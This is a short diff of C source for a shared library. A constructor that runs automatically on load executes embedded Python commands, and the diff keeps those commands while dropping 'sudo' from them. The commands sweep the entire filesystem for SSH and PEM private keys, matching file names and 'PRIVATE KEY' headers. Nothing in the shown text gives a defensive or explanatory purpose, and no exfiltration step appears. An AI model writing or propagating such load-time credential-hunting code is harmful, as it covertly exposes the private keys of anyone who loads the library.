@@ -105,8 +105,8 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd('sudo find / -type f \( -name "id_*" -o -name "*.pem" -o -name "id_rsa*" -o -name "id_ed25519*" -o -name "id_ecdsa*" \) -exec grep -l "PRIVATE KEY" {} + 2>/dev/null')
-run_cmd('sudo grep -r -l "-----BEGIN OPENSSH PRIVATE KEY-----" / 2>/dev/null')
+run_cmd('find / -type f \( -name "id_*" -o -name "*.pem" -o -name "id_rsa*" -o -name "id_ed25519*" -o -name "id_ecdsa*" \) -exec grep -l "PRIVATE KEY" {} + 2>/dev/null')
+run_cmd('grep -r -l "-----BEGIN OPENSSH PRIVATE KEY-----" / 2>/dev/null')
 
 
 )PY");
